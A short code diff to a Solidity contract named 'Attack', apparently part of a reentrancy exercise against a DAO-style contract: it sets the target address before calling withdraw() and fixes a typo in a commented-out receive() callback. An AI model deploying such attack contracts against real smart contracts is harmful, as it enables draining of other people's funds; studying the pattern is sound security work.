@@ -16,6 +16,7 @@ contract Attack{
         mydao.deposit{value: msg.value}();
     }
     function attack(address _address) public payable {
+        mydao = Dao_inf(_address);
         // Withdraw from Dao.
         mydao.withdraw();
     }
@@ -27,6 +28,6 @@ contract Attack{
     }
     // receive() external payable{
     //     (bool sent, ) = msg.sender.call{value: 0.1}("");
-    //     require(sent, "Failed123 to withdraw sender's balance");
+    //     require(sent, "Failed to withdraw sender's balance");
     // }
 }
